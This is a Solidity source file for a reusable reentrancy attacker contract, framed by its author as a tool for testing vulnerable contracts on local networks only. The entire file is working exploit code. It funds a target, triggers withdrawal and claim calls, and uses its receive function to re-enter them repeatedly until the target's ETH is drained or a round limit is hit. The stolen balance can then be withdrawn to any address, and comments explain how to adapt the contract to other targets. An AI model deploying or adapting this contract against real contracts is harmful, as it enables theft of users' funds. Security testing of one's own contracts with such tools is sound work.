// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

/// @title KingReentrancyAttacker contract (For local testing only).
/// @author Michealking (@BuildsWithKing).
/// @custom:securitycontact buildswithking@gmail.com
/**
 * @notice Created on the 24th of Aug, 2025.
 *         Updated on the 9th of Oct, 2025.
 *
 *          Reusable attacker contract for testing reentrancy vulnerabilities.
 *
 * @dev PURPOSE: This contract is intended for testing and security validation only.
 *               Use it against contracts you control (local network / devnets).
 *
 *               Do NOT use on third-party mainnet contracts without explicit permission.
 *
 */
interface IVulnerable {
    // ------------------------------------------- Functions ----------------------------------
    /// @notice List of all the available contract functions (Include yours if its not listed here).
    function depositETH() external payable;
    function withdrawETH(uint256 _ethAmount) external;
    function claimMistakenETH() external;
}

contract KingReentrancyAttacker {
    // ------------------------------------------- Custom Errors ------------------------------
    /// @notice Thrown for zero address input.
    /// @dev Thrown when the contract deployer (attacker) inputs the zero address.
    /// @param _zeroAddress The zero address.
    error InvalidAddress(address _zeroAddress);

    /// @notice Thrown for zero max reentrancy.
    /// @dev Thrown when the contract deployer inputs zero as max reentrancy.
    /// @param _zero The zero max reentrancy value.
    error ZeroMaxReentrancy(uint64 _zero);

    /// @notice Thrown when a user attempts performing the attacker's function.
    /// @dev Thrown when caller isn't the attacker.
    /// @param _user The user's address.
    /// @param _attacker The attacker's address.
    error Unauthorized(address _user, address _attacker);

    /// @notice Thrown for zero ETH deposit.
    /// @dev Thrown when the attacker tries attacking with zero ETH.
    error AmountTooLow();

    /// @notice Thrown when the attacker's withdrawal fails.
    /// @dev Thrown when the attacker tries withdrawing and it fails.
    error WithdrawalFailed();

    // ------------------------------------------- State Variable ---------------------------------
    /// @notice Records the targetted contract.
    IVulnerable private immutable i_target;

    /// @notice Records the attacker's address.
    address private immutable i_attacker;

    /// @notice Records the attacking state.
    /// @dev Attacks once the attack state is true, using the receive function to reenter.
    bool public s_isAttacking;

    /// @notice Records the maximum reentrancy attempts.
    uint8 private immutable i_maxReentrancy;

    /// @notice Records the numbers of attacks.
    uint8 private s_rounds;

    // ------------------------------------------- Events --------------------------------------
    /// @notice Emitted once the attack has started.
    /// @param _attackerAddress The attacker's address.
    /// @param _targetAddress The target contract address.
    /// @param _ethAmount The amount of ETH funded on the target contract.
    event AttackStarted(address indexed _attackerAddress, address indexed _targetAddress, uint256 _ethAmount);

    /// @notice Emitted once the attack stops.
    /// @param _attackerAddress The attacker's address.
    /// @param _contractBalance This contract's balance.
    /// @param _targetBalance The target contract's balance.
    event AttackStopped(address indexed _attackerAddress, uint256 _contractBalance, uint256 _targetBalance);

    /// @notice Emitted once this contract receives ETH.
    /// @param _contractAddress The depositing contract address.
    /// @param _ethAmount The amount of ETH deposited.
    event EthDeposited(address indexed _contractAddress, uint256 _ethAmount);

    /// @notice Emitted once the attacker withdraws ETH.
    /// @param _attackerAddress The attacker's address.
    /// @param _ethAmount The amount of ETH withdrawn.
    /// @param _receiverAddress The receiver's address.
    event EthWithdrawn(address indexed _attackerAddress, uint256 _ethAmount, address indexed _receiverAddress);

    // ---------------------------------------- Modifier -----------------------------------------

    /// @dev Restricts access to only the attacker.
    modifier onlyAttacker() {
        // Revert if caller is not the attacker.
        if (msg.sender != i_attacker) {
            revert Unauthorized(msg.sender, i_attacker);
        }
        _;
    }

    // ----------------------------------------- Constructor -------------------------------------
    /// @notice Sets the contract to be attacked and the attacker's address at deployment.
    /// @param _contractAddress The target contract address.
    /// @param _maxReentrancy The maximum number of reentrancy attempt.
    constructor(address payable _contractAddress, uint8 _maxReentrancy) {
        // Revert if _contractAddress is the zero or this contract address.
        if (_contractAddress == address(0) || _contractAddress == address(this)) {
            revert InvalidAddress(_contractAddress);
        }

        // Revert if _maxReentrancy is set to zero.
        if (_maxReentrancy == 0) {
            revert ZeroMaxReentrancy(_maxReentrancy);
        }

        // Assign i_target.
        i_target = IVulnerable(_contractAddress);

        // Assign i_maxReentrancy.
        i_maxReentrancy = _maxReentrancy;

        // Assign contract deployer as attacker.
        i_attacker = msg.sender;
    }

    // ------------------------------------------- Attacker Write Functions ----------------------
    /**
     * @notice Funds the target contract and starts the attack.
     *
     *     To run test on contracts with a different function name, feel free to edit and include them
     *     e.g i_target.deposit{value: msg.value}(); or i_target.withdraw(msg.value), remember to
     *     include the withdrawal logic on the receive function for simulating reentrancy.
     */
    function fundAndAttack() external payable onlyAttacker {
        // Revert if the attacker's deposit is equal to zero.
        if (msg.value == 0) {
            revert AmountTooLow();
        }

        // Assign zero to s_round.
        s_rounds = 0;

        // Set the attack state to true.
        s_isAttacking = true;

        // Deposit ETH to the targetted contract.
        i_target.depositETH{value: msg.value}();

        // Initial claim attempt to trigger reentrancy.
        i_target.claimMistakenETH();

        // Initial withdraw attempt to trigger reentrancy.
        i_target.withdrawETH(msg.value);

        // Emit the event AttackStarted.
        emit AttackStarted(i_attacker, address(i_target), msg.value);
    }

    /// @notice Stops automatic reentry attempts.
    function stopAttack() external onlyAttacker {
        // Set attack state to false.
        s_isAttacking = false;

        // Emit the event AttackStopped.
        emit AttackStopped(msg.sender, address(this).balance, address(i_target).balance);
    }

    /// @notice Withdraws ETH. Callable only by the attacker.
    /// @param _ethAmount The amount of ETH being withdrawn.
    /// @param _receiverAddress The receiver's address.
    function withdrawETH(uint256 _ethAmount, address _receiverAddress) external onlyAttacker {
        // Revert if the _receiverAddress is the zero or this contract address.
        if (_receiverAddress == address(0) || _receiverAddress == address(this)) {
            revert InvalidAddress(_receiverAddress);
        }

        // Fund _receiverAddress the amount withdrawn. Revert if withdrawal fails.
        (bool success,) = payable(_receiverAddress).call{value: _ethAmount}("");
        if (!success) {
            revert WithdrawalFailed();
        }

        // Emit the event EthWithdrawn.
        emit EthWithdrawn(msg.sender, _ethAmount, _receiverAddress);
    }

    // ----------------------------------------- Attacker Read Functions -------------------------
    /// @notice Returns the contract balance.
    /// @return Contract balance.
    function contractBalance() external view returns (uint256) {
        return address(this).balance;
    }

    /// @notice Returns the target contract's address.
    /// @return Target contract address.
    function targetContract() external view returns (IVulnerable) {
        return i_target;
    }

    /// @notice Returns the attack rounds.
    /// @return Attack rounds.
    function attackRounds() external view returns (uint8) {
        return s_rounds;
    }

    /// @notice Returns the maximum reentrancy attempt.
    /// @return Maximum reentrancy attempt.
    function maximumReentrancy() external view returns (uint8) {
        return i_maxReentrancy;
    }

    /// @notice Returns the attacker's address.
    /// @return Attacker's address.
    function attacker() external view returns (address) {
        return i_attacker;
    }

    // ----------------------------------------- Receive Function --------------------------------
    /// @notice Handles Eth with no calldata and Reenters the target contract.
    receive() external payable {
        // Assign _targetBalance.
        uint256 _targetBalance = address(i_target).balance;

        // Stop attack if targetted contract has no funds.
        if (_targetBalance == 0) {
            // Set attacking state to false.
            s_isAttacking = false;

            // Emit the event AttackStopped.
            emit AttackStopped(i_attacker, address(this).balance, _targetBalance);

            return;
        }

        // Increment s_round by one for every successful attack.
        unchecked {
            s_rounds++;
        }

        // If the attack rounds is greater or equal to maximum reentrancy attempt, Stop the attack.
        if (s_rounds >= i_maxReentrancy) {
            // Set attacking state to false.
            s_isAttacking = false;

            // Emit the event AttackStopped.
            emit AttackStopped(i_attacker, address(this).balance, _targetBalance);

            return;
        }

        // Reentrant call for claimMistakenETH.
        i_target.claimMistakenETH();

        // Reentrant call for withdrawETH.
        i_target.withdrawETH(msg.value);

        // Emit the event EthDeposited.
        emit EthDeposited(address(i_target), msg.value);
    }
}
